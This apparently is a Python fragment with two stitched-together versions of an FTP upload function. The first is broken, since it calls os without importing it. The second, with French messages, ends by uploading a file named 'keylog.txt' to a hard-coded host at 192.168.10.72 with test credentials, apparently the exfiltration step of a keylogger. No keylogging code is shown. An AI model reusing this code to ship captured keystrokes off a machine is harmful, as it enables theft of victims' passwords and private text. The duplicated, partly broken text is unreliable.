from ftplib import FTP

def upload_file_ftp(server, user, password, filepath):
    ftp = FTP(server)
    ftp.login(user=user, passwd=password)

    with open(filepath, "rb") as file:
        ftp.storbinary(f"STOR {os.path.basename(filepath)}", file)

    ftp.quit()
from ftplib import FTP

def upload_file_ftp(server, username, password, filename):
    try:
        ftp = FTP(server)
        ftp.login(username, password)
        with open(filename, 'rb') as f:
            ftp.storbinary(f'STOR {filename}', f)
        ftp.quit()
        print(f"Fichier {filename} envoyé sur FTP.")
    except Exception as e:
        print(f"Erreur lors de l'envoi FTP : {e}")

if __name__ == "__main__":
    upload_file_ftp("192.168.10.72", "test", "test", "keylog.txt")
